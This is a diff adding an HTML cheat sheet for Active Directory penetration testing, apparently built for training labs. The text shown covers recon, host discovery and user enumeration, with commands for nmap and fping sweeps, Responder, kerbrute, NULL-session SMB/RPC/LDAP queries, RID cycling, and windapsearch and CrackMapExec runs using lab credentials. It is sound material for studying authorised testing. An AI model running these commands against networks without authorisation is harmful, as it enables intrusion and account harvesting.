@@ -1,0 +1,2526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Pentest Reference</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10;
+    --surface: #0f1117;
+    --surface2: #161921;
+    --surface3: #1d2130;
+    --border: #252a38;
+    --border-bright: #2e3547;
+    --text: #c8d0e0;
+    --text-dim: #7a8499;
+    --text-bright: #e8edf5;
+    --accent: #4fc3f7;
+    --accent2: #81c784;
+    --accent3: #ffb74d;
+    --accent4: #f06292;
+    --accent5: #ce93d8;
+    --red: #ef5350;
+    --glow: rgba(79, 195, 247, 0.12);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* GRID BG */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(79,195,247,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(79,195,247,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* HEADER */
+  header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(10,12,16,0.92);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+    padding: 0 2rem;
+  }
+
+  .header-inner {
+    max-width: 1600px;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 64px;
+    gap: 1.5rem;
+  }
+
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    flex-shrink: 0;
+  }
+
+  .logo-icon {
+    width: 36px;
+    height: 36px;
+    background: linear-gradient(135deg, var(--accent), var(--accent5));
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+  }
+
+  .logo h1 {
+    font-size: 1.1rem;
+    font-weight: 800;
+    color: var(--text-bright);
+    letter-spacing: -0.02em;
+  }
+
+  .logo span {
+    color: var(--accent);
+  }
+
+  /* SEARCH */
+  .search-wrap {
+    flex: 1;
+    max-width: 480px;
+    position: relative;
+  }
+
+  .search-wrap input {
+    width: 100%;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.55rem 1rem 0.55rem 2.5rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .search-wrap input::placeholder { color: var(--text-dim); }
+  .search-wrap input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px var(--glow);
+  }
+
+  .search-icon {
+    position: absolute;
+    left: 0.75rem;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-dim);
+    font-size: 0.9rem;
+  }
+
+  /* NAV PILLS */
+  .nav-pills {
+    display: flex;
+    gap: 0.4rem;
+    flex-wrap: wrap;
+  }
+
+  .pill {
+    padding: 0.3rem 0.8rem;
+    border-radius: 20px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--text-dim);
+    font-family: 'Syne', sans-serif;
+    font-size: 0.72rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    white-space: nowrap;
+  }
+
+  .pill:hover, .pill.active {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: #000;
+  }
+
+  /* LAYOUT */
+  .layout {
+    display: flex;
+    max-width: 1600px;
+    margin: 0 auto;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* SIDEBAR */
+  aside {
+    width: 260px;
+    flex-shrink: 0;
+    position: sticky;
+    top: 64px;
+    height: calc(100vh - 64px);
+    overflow-y: auto;
+    border-right: 1px solid var(--border);
+    padding: 1.5rem 1rem;
+    scrollbar-width: thin;
+    scrollbar-color: var(--border) transparent;
+  }
+
+  .sidebar-section {
+    margin-bottom: 1.5rem;
+  }
+
+  .sidebar-title {
+    font-size: 0.65rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.12em;
+    color: var(--text-dim);
+    padding: 0 0.5rem;
+    margin-bottom: 0.5rem;
+  }
+
+  .sidebar-link {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 0.45rem 0.6rem;
+    border-radius: 7px;
+    font-size: 0.8rem;
+    color: var(--text-dim);
+    cursor: pointer;
+    transition: all 0.15s;
+    border: none;
+    background: none;
+    width: 100%;
+    text-align: left;
+    font-family: 'Syne', sans-serif;
+  }
+
+  .sidebar-link:hover {
+    background: var(--surface2);
+    color: var(--text);
+  }
+
+  .sidebar-link.active {
+    background: var(--glow);
+    color: var(--accent);
+    border-left: 2px solid var(--accent);
+    padding-left: calc(0.6rem - 2px);
+  }
+
+  .sidebar-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  /* MAIN CONTENT */
+  main {
+    flex: 1;
+    padding: 2rem;
+    min-width: 0;
+  }
+
+  /* SECTION */
+  .section {
+    margin-bottom: 3rem;
+    display: none;
+  }
+
+  .section.visible {
+    display: block;
+    animation: fadeIn 0.3s ease;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin-bottom: 1.5rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-icon {
+    width: 44px;
+    height: 44px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.2rem;
+    flex-shrink: 0;
+  }
+
+  .section-title {
+    font-size: 1.5rem;
+    font-weight: 800;
+    color: var(--text-bright);
+    letter-spacing: -0.02em;
+  }
+
+  .section-desc {
+    font-size: 0.82rem;
+    color: var(--text-dim);
+    margin-top: 0.2rem;
+    line-height: 1.5;
+  }
+
+  /* CARDS GRID */
+  .cards {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
+    gap: 1rem;
+  }
+
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .card:hover {
+    border-color: var(--border-bright);
+    box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.8rem 1rem;
+    background: var(--surface2);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .card-title {
+    font-size: 0.82rem;
+    font-weight: 700;
+    color: var(--text-bright);
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .badge {
+    font-size: 0.62rem;
+    font-weight: 700;
+    padding: 0.15rem 0.45rem;
+    border-radius: 4px;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  .badge-linux { background: rgba(129,199,132,0.15); color: var(--accent2); }
+  .badge-windows { background: rgba(79,195,247,0.15); color: var(--accent); }
+  .badge-both { background: rgba(206,147,216,0.15); color: var(--accent5); }
+  .badge-warn { background: rgba(239,83,80,0.15); color: var(--red); }
+  .badge-tool { background: rgba(255,183,77,0.15); color: var(--accent3); }
+
+  .card-body {
+    padding: 0.9rem 1rem;
+  }
+
+  .card-note {
+    font-size: 0.77rem;
+    color: var(--text-dim);
+    line-height: 1.55;
+    margin-bottom: 0.8rem;
+  }
+
+  /* CODE BLOCKS */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 0.8rem 1rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    color: #a8d8a8;
+    line-height: 1.7;
+    position: relative;
+    overflow-x: auto;
+    white-space: pre;
+    margin-bottom: 0.6rem;
+  }
+
+  .code-block .cmd { color: #81c784; }
+  .code-block .flag { color: #4fc3f7; }
+  .code-block .string { color: #ffb74d; }
+  .code-block .comment { color: #546e7a; }
+
+  .copy-btn {
+    position: absolute;
+    top: 0.4rem;
+    right: 0.4rem;
+    background: var(--surface3);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    color: var(--text-dim);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.6rem;
+    padding: 0.2rem 0.45rem;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+
+  .copy-btn:hover {
+    background: var(--accent);
+    color: #000;
+    border-color: var(--accent);
+  }
+
+  .copy-btn.copied {
+    background: var(--accent2);
+    color: #000;
+    border-color: var(--accent2);
+  }
+
+  /* STEP LIST */
+  .steps {
+    display: flex;
+    flex-direction: column;
+    gap: 0.5rem;
+    margin-bottom: 0.8rem;
+  }
+
+  .step {
+    display: flex;
+    gap: 0.75rem;
+    align-items: flex-start;
+    font-size: 0.77rem;
+    color: var(--text-dim);
+  }
+
+  .step-num {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    background: var(--surface3);
+    border: 1px solid var(--border-bright);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 0.62rem;
+    font-weight: 700;
+    color: var(--accent);
+    flex-shrink: 0;
+  }
+
+  /* LINKS */
+  .ext-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.3rem;
+    color: var(--accent);
+    font-size: 0.75rem;
+    font-family: 'JetBrains Mono', monospace;
+    text-decoration: none;
+    border-bottom: 1px dashed rgba(79,195,247,0.4);
+    transition: all 0.15s;
+    padding-bottom: 1px;
+  }
+
+  .ext-link:hover {
+    color: #fff;
+    border-bottom-color: #fff;
+  }
+
+  .links-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    margin-top: 0.5rem;
+  }
+
+  /* ATTACK CHAIN */
+  .chain {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+    padding: 0.8rem;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 0.8rem;
+  }
+
+  .chain-item {
+    font-size: 0.72rem;
+    font-weight: 600;
+    padding: 0.25rem 0.6rem;
+    border-radius: 5px;
+    color: var(--text-bright);
+  }
+
+  .chain-arrow {
+    color: var(--text-dim);
+    font-size: 0.8rem;
+  }
+
+  /* OVERVIEW CARDS */
+  .overview-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 0.8rem;
+    margin-bottom: 2rem;
+  }
+
+  .ov-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1rem;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-align: center;
+  }
+
+  .ov-card:hover {
+    border-color: var(--accent);
+    box-shadow: 0 0 20px var(--glow);
+    transform: translateY(-2px);
+  }
+
+  .ov-icon { font-size: 1.8rem; margin-bottom: 0.5rem; }
+  .ov-label {
+    font-size: 0.78rem;
+    font-weight: 700;
+    color: var(--text-bright);
+  }
+  .ov-count {
+    font-size: 0.68rem;
+    color: var(--text-dim);
+    margin-top: 0.2rem;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* HIGHLIGHT */
+  mark {
+    background: rgba(79,195,247,0.25);
+    color: var(--accent);
+    border-radius: 2px;
+    padding: 0 2px;
+  }
+
+  /* SCROLLBAR */
+  ::-webkit-scrollbar { width: 5px; height: 5px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+  /* RESPONSIVE */
+  @media (max-width: 900px) {
+    aside { display: none; }
+    .cards { grid-template-columns: 1fr; }
+    .nav-pills { display: none; }
+  }
+
+  .tag-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.35rem;
+    margin-top: 0.5rem;
+  }
+
+  .tag {
+    font-size: 0.65rem;
+    font-family: 'JetBrains Mono', monospace;
+    padding: 0.15rem 0.4rem;
+    border-radius: 4px;
+    background: var(--surface3);
+    color: var(--text-dim);
+    border: 1px solid var(--border);
+  }
+
+  .section-all { display: block !important; }
+
+  .no-results {
+    text-align: center;
+    padding: 4rem 2rem;
+    color: var(--text-dim);
+  }
+
+  .no-results .nr-icon { font-size: 3rem; margin-bottom: 1rem; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <div class="logo">
+      <div class="logo-icon">🔐</div>
+      <h1>AD <span>Pentest</span> Reference</h1>
+    </div>
+    <div class="search-wrap">
+      <span class="search-icon">🔍</span>
+      <input type="text" id="searchInput" placeholder="Search commands, tools, techniques..." />
+    </div>
+    <nav class="nav-pills">
+      <button class="pill active" onclick="filterAll()">All</button>
+      <button class="pill" onclick="filterSection('recon')">Recon</button>
+      <button class="pill" onclick="filterSection('enum')">Enum</button>
+      <button class="pill" onclick="filterSection('spray')">Spraying</button>
+      <button class="pill" onclick="filterSection('kerb')">Kerberos</button>
+      <button class="pill" onclick="filterSection('acl')">ACL</button>
+      <button class="pill" onclick="filterSection('trusts')">Trusts</button>
+      <button class="pill" onclick="filterSection('misc')">Misc</button>
+    </nav>
+  </div>
+</header>
+
+<div class="layout">
+  <aside>
+    <div class="sidebar-section">
+      <div class="sidebar-title">Navigation</div>
+      <button class="sidebar-link active" onclick="scrollToSection('overview')"><span class="sidebar-dot" style="background:#4fc3f7"></span>Overview</button>
+      <button class="sidebar-link" onclick="scrollToSection('recon')"><span class="sidebar-dot" style="background:#81c784"></span>External Recon</button>
+      <button class="sidebar-link" onclick="scrollToSection('host-disc')"><span class="sidebar-dot" style="background:#ffb74d"></span>Host Discovery</button>
+      <button class="sidebar-link" onclick="scrollToSection('user-enum')"><span class="sidebar-dot" style="background:#f06292"></span>User Enumeration</button>
+      <button class="sidebar-link" onclick="scrollToSection('pass-policy')"><span class="sidebar-dot" style="background:#ce93d8"></span>Password Policy</button>
+      <button class="sidebar-link" onclick="scrollToSection('cred-enum-linux')"><span class="sidebar-dot" style="background:#4fc3f7"></span>Cred Enum (Linux)</button>
+      <button class="sidebar-link" onclick="scrollToSection('cred-enum-win')"><span class="sidebar-dot" style="background:#81c784"></span>Cred Enum (Windows)</button>
+      <button class="sidebar-link" onclick="scrollToSection('spray')"><span class="sidebar-dot" style="background:#ffb74d"></span>Password Spraying</button>
+      <button class="sidebar-link" onclick="scrollToSection('llmnr')"><span class="sidebar-dot" style="background:#f06292"></span>LLMNR Poisoning</button>
+      <button class="sidebar-link" onclick="scrollToSection('kerb')"><span class="sidebar-dot" style="background:#ce93d8"></span>Kerberoasting</button>
+      <button class="sidebar-link" onclick="scrollToSection('asrep')"><span class="sidebar-dot" style="background:#4fc3f7"></span>ASREPRoasting</button>
+      <button class="sidebar-link" onclick="scrollToSection('acl')"><span class="sidebar-dot" style="background:#ef5350"></span>ACL Abuse</button>
+      <button class="sidebar-link" onclick="scrollToSection('dcsync')"><span class="sidebar-dot" style="background:#ffb74d"></span>DCSync</button>
+      <button class="sidebar-link" onclick="scrollToSection('access')"><span class="sidebar-dot" style="background:#81c784"></span>Remote Access</button>
+      <button class="sidebar-link" onclick="scrollToSection('exploits')"><span class="sidebar-dot" style="background:#f06292"></span>Exploits</button>
+      <button class="sidebar-link" onclick="scrollToSection('trusts')"><span class="sidebar-dot" style="background:#ce93d8"></span>Domain Trusts</button>
+      <button class="sidebar-link" onclick="scrollToSection('misc')"><span class="sidebar-dot" style="background:#4fc3f7"></span>Misc Misconfigs</button>
+      <button class="sidebar-link" onclick="scrollToSection('lotl')"><span class="sidebar-dot" style="background:#81c784"></span>Living Off Land</button>
+    </div>
+
+    <div class="sidebar-section">
+      <div class="sidebar-title">Quick Tools</div>
+      <button class="sidebar-link" onclick="scrollToSection('cred-enum-linux')"><span>🐧</span> CrackMapExec</button>
+      <button class="sidebar-link" onclick="scrollToSection('kerb')"><span>🎟️</span> Rubeus</button>
+      <button class="sidebar-link" onclick="scrollToSection('cred-enum-win')"><span>🦅</span> BloodHound</button>
+      <button class="sidebar-link" onclick="scrollToSection('exploits')"><span>💥</span> Impacket</button>
+    </div>
+  </aside>
+
+  <main id="mainContent">
+
+    <!-- OVERVIEW -->
+    <div class="section visible" id="overview" data-tags="overview all">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#4fc3f7,#1565c0)">🗺️</div>
+        <div>
+          <div class="section-title">Active Directory Pentest Playbook</div>
+          <div class="section-desc">Complete reference for AD enumeration, attacks, and exploitation. Click any category to jump directly to that section.</div>
+        </div>
+      </div>
+
+      <div class="overview-grid">
+        <div class="ov-card" onclick="scrollToSection('recon')">
+          <div class="ov-icon">🌐</div>
+          <div class="ov-label">External Recon</div>
+          <div class="ov-count">DNS · OSINT · Credentials</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('host-disc')">
+          <div class="ov-icon">📡</div>
+          <div class="ov-label">Host Discovery</div>
+          <div class="ov-count">fping · nmap · Wireshark</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('user-enum')">
+          <div class="ov-icon">👥</div>
+          <div class="ov-label">User Enumeration</div>
+          <div class="ov-count">SMB NULL · LDAP · Kerbrute</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('pass-policy')">
+          <div class="ov-icon">🔒</div>
+          <div class="ov-label">Password Policy</div>
+          <div class="ov-count">enum4linux · rpcclient</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('llmnr')">
+          <div class="ov-icon">🎣</div>
+          <div class="ov-label">LLMNR Poisoning</div>
+          <div class="ov-count">Responder · Inveigh</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('kerb')">
+          <div class="ov-icon">🎟️</div>
+          <div class="ov-label">Kerberoasting</div>
+          <div class="ov-count">Rubeus · GetUserSPNs</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('asrep')">
+          <div class="ov-icon">🔓</div>
+          <div class="ov-label">ASREPRoasting</div>
+          <div class="ov-count">GetNPUsers · Rubeus</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('acl')">
+          <div class="ov-icon">🔑</div>
+          <div class="ov-label">ACL Abuse</div>
+          <div class="ov-count">PowerView · WriteDacl</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('dcsync')">
+          <div class="ov-icon">💀</div>
+          <div class="ov-label">DCSync</div>
+          <div class="ov-count">Mimikatz · secretsdump</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('exploits')">
+          <div class="ov-icon">💥</div>
+          <div class="ov-label">CVE Exploits</div>
+          <div class="ov-count">NoPac · PrintNightmare · PetitPotam</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('trusts')">
+          <div class="ov-icon">🌳</div>
+          <div class="ov-label">Domain Trusts</div>
+          <div class="ov-count">Child→Parent · Cross-Forest</div>
+        </div>
+        <div class="ov-card" onclick="scrollToSection('misc')">
+          <div class="ov-icon">⚙️</div>
+          <div class="ov-label">Misc Misconfigs</div>
+          <div class="ov-count">GPP · GPO · Printer Bug</div>
+        </div>
+      </div>
+
+      <!-- Attack Chain -->
+      <div class="card">
+        <div class="card-header">
+          <div class="card-title">⛓️ Typical Attack Chain</div>
+          <span class="badge badge-warn">HIGH LEVEL</span>
+        </div>
+        <div class="card-body">
+          <div class="card-note">A common AD compromise path from initial foothold to domain dominance.</div>
+          <div class="chain">
+            <div class="chain-item" style="background:rgba(79,195,247,0.15);color:var(--accent)">Recon / OSINT</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(129,199,132,0.15);color:var(--accent2)">Host Discovery</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(255,183,77,0.15);color:var(--accent3)">User Enum</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(240,98,146,0.15);color:var(--accent4)">LLMNR Poison</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(206,147,216,0.15);color:var(--accent5)">Password Spray</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(79,195,247,0.15);color:var(--accent)">Kerberoast</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(239,83,80,0.15);color:var(--red)">ACL Abuse</div>
+            <span class="chain-arrow">→</span>
+            <div class="chain-item" style="background:rgba(239,83,80,0.2);color:var(--red)">DCSync / DA</div>
+          </div>
+          <div class="card-note">Prerequisites for domain enumeration: Domain User credentials OR SYSTEM shell on domain-joined host, and DC IP/hostname.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- EXTERNAL RECON -->
+    <div class="section" id="recon" data-tags="recon external osint dns credentials">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#81c784,#2e7d32)">🌐</div>
+        <div>
+          <div class="section-title">External Recon</div>
+          <div class="section-desc">Gather information about the target from external sources before engaging the network.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌍 Address Space / DNS Discovery</div>
+            <span class="badge badge-tool">OSINT</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Identify target IP ranges, ASNs, nameservers, and public records.</div>
+            <div class="code-block">nslookup <span class="string"># validate nameservers</span></div>
+            <div class="links-row">
+              <a class="ext-link" href="http://he.net/" target="_blank">↗ Hurricane Electric (ASN lookup)</a>
+              <a class="ext-link" href="https://whois.domaintools.com/" target="_blank">↗ DomainTools WHOIS</a>
+              <a class="ext-link" href="http://viewdns.info/" target="_blank">↗ ViewDNS.info</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📧 Email / Username Harvesting</div>
+            <span class="badge badge-tool">OSINT</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Build username lists from LinkedIn and public data for later spraying.</div>
+            <div class="code-block"><span class="comment"># Google dorks for emails and files</span>
+filetype:pdf inurl:inlanefreight.com
+intext:"@inlanefreight.com" inurl:inlanefreight.com</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/initstring/linkedin2username" target="_blank">↗ linkedin2username (GitHub)</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔑 Credential / Secret Hunting</div>
+            <span class="badge badge-tool">OSINT</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Look for leaked credentials, secrets in public repos, and exposed cloud buckets.</div>
+            <div class="code-block">sudo python3 dehashed.py -q &lt;hostname&gt; -p</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://dehashed.com/" target="_blank">↗ Dehashed</a>
+              <a class="ext-link" href="https://github.com/trufflesecurity/truffleHog" target="_blank">↗ TruffleHog</a>
+              <a class="ext-link" href="https://buckets.grayhatwarfare.com/" target="_blank">↗ GrayHat Warfare (Buckets)</a>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- HOST DISCOVERY -->
+    <div class="section" id="host-disc" data-tags="host discovery nmap fping wireshark passive active">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#ffb74d,#e65100)">📡</div>
+        <div>
+          <div class="section-title">Host Discovery</div>
+          <div class="section-desc">Identify live hosts on the network using passive and active techniques.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">👁️ Passive Discovery</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Capture traffic to identify hosts without sending probes. Watch for ARP and mDNS packets.</div>
+            <div class="code-block">sudo -E wireshark
+sudo tcpdump -i ens224</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/DanMcInerney/net-creds" target="_blank">↗ net-creds</a>
+              <a class="ext-link" href="https://www.netminer.com/en/product/netminer.php" target="_blank">↗ NetMiner</a>
+            </div>
+            <div class="card-note" style="margin-top:0.5rem">Windows alternative: <code style="color:var(--accent3)">pktmon.exe</code></div>
+            <div class="code-block">sudo responder -I ens224 -A  <span class="comment"># passive/analysis mode</span></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">⚡ Active Discovery</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Send probes to identify live hosts and open services.</div>
+            <div class="code-block">fping -asgq 172.16.5.0/23</div>
+            <div class="code-block">nmap -sn 172.16.5.0/23  <span class="comment"># ping sweep</span>
+nmap -p 88 172.16.5.0/23  <span class="comment"># Kerberos port for DCs</span></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔍 User Identification via Kerbrute</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Validate usernames against Kerberos (port 88) without triggering account lockout. Generates an event ID 4768.</div>
+            <div class="code-block">kerbrute userenum -d INLANEFREIGHT.LOCAL \
+  --dc 172.16.5.5 jsmith.txt -o valid_ad_users</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/ropnop/kerbrute/releases" target="_blank">↗ Kerbrute Releases</a>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- USER ENUMERATION -->
+    <div class="section" id="user-enum" data-tags="user enumeration smb ldap rpcclient enum4linux kerbrute crackmapexec">
+      <div class="section-header">
+        <div class="section-icon" style="background:linear-gradient(135deg,#f06292,#880e4f)">👥</div>
+        <div>
+          <div class="section-title">User Enumeration</div>
+          <div class="section-desc">Build a target user list using unauthenticated and credentialed techniques across SMB, LDAP, and RPC.</div>
+        </div>
+      </div>
+      <div class="cards">
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📂 SMB NULL Session</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Enumerate users over SMB without credentials (NULL session). Works on older/misconfigured DCs.</div>
+            <div class="code-block">enum4linux -U 172.16.5.5 | grep "user:" | \
+  cut -f2 -d"[" | cut -f1 -d"]"</div>
+            <div class="code-block">smbclient -N -L \\\\&lt;target_ip&gt;
+smbclient -L //10.10.10.178 -U ""</div>
+            <div class="code-block">crackmapexec smb 172.16.5.5 --users
+netexec smb 10.10.11.236 -u guest -p '' --rid-brute</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔌 RPC Enumeration</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Use rpcclient for NULL-session enumeration and RID cycling to brute-force SIDs.</div>
+            <div class="code-block">rpcclient -U "" -N 172.16.5.5
+rpcclient $> enumdomusers
+rpcclient $> queryuser &lt;RID&gt;</div>
+            <div class="code-block"><span class="comment"># RID cycling with Impacket</span>
+lookupsid.py 0xdf@manager.htb -no-pass
+lookupsid.py 0xdf@manager.htb -no-pass | \
+  grep SidTypeUser | cut -d' ' -f2 | \
+  cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">📋 LDAP Anonymous Enumeration</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Query LDAP on port 389 without credentials to retrieve user objects.</div>
+            <div class="code-block">ldapsearch -h 172.16.5.5 -x \
+  -b "DC=INLANEFREIGHT,DC=LOCAL" \
+  -s sub "(&(objectclass=user))" | \
+  grep sAMAccountName: | cut -f2 -d" "</div>
+            <div class="code-block"><span class="comment"># Enumerate naming contexts first</span>
+ldapsearch -H ldap://dc01.manager.htb -x \
+  -s base namingcontexts</div>
+            <div class="code-block"><span class="comment"># With valid credentials - ldapdomaindump</span>
+ldapdomaindump -u 'management.htb\\operator' \
+  -p 'operator' 10.10.11.236 -o ldap/</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🌀 windapsearch</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="code-block"><span class="comment"># Anonymous user enumeration</span>
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+<span class="comment"># Privileged users (credentialed)</span>
+python3 windapsearch.py --dc-ip 172.16.5.5 \
+  -u forend@inlanefreight.local \
+  -p Klmcargo2 -PU
+
+<span class="comment"># Domain Admins</span>
+python3 windapsearch.py --dc-ip 172.16.5.5 \
+  -u forend@inlanefreight.local \
+  -p Klmcargo2 --da</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">🔑 Kerbrute User Enum</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Validate usernames via Kerberos pre-auth (port 88). Fast and generates minimal noise.</div>
+            <div class="code-block">kerbrute userenum -d inlanefreight.local \
+  --dc 172.16.5.5 /opt/jsmith.txt
+
+kerbrute userenum \
+  /opt/SecLists/Usernames/cirt-default-usernames.txt \
+  --dc dc01.manager.htb -d manager.htb</div>
+            <div class="links-row">
+              <a class="ext-link" href="https://github.com/ropnop/kerbrute/releases" target="_blank">↗ Download Kerbrute</a>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">✅ Credentialed Enumeration</div>
+            <span class="badge badge-linux">LINUX</span>
+          </div>
+          <div class="card-body">
+            <div class="card-note">Use valid credentials with CrackMapExec for reliable user listing.</div>
+            <div class="code-block">sudo crackmapexec smb 172.16.5.5 \
+  -u htbstudent -p Academy_student_AD! --users</div>
+          </div>
+        </div>
+
